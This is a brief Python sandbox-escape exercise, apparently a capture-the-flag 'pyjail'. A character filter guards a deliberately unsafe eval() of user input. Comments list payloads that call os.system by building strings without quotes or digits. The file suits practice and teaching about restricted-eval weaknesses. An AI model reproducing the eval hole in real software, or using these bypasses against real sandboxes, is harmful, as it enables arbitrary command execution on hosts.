def check_eval():
    a = input('try os.system("cmd")!')
    if a.find('\'') != -1 or a.find('\"') != -1 \
            or '[' in a \
            or ']' in a \
            or '{' in a \
            or '}' in a \
            or "\'" in a \
            or "\"" in a \
            or not all(0 <= ord(c) <= 255 for c in a) \
            or any(c.isdigit() for c in a):
        print('NO WAY!')
        return
    else:
        try:
            eval(a, {}, {})
            print('SUCCESS!')
        except:
            print('ERROR!')
            pass


check_eval()

# __import__(().__doc__[34]+().__doc__[19]).system(().__doc__[59] + ().__doc__[40] + ().__doc__[118])

# __import__(chr(111) + chr(115)).system(chr(99) + chr(109) + chr(100))

# __import__(list(dict(os=1))[0]).system(list(dict(cmd=1))[0])

# 无数字：

# __import__(list(dict(os=True)).__getitem__(int(any(())))).system(list(dict(cmd=True)).__getitem__(int(any(()))))
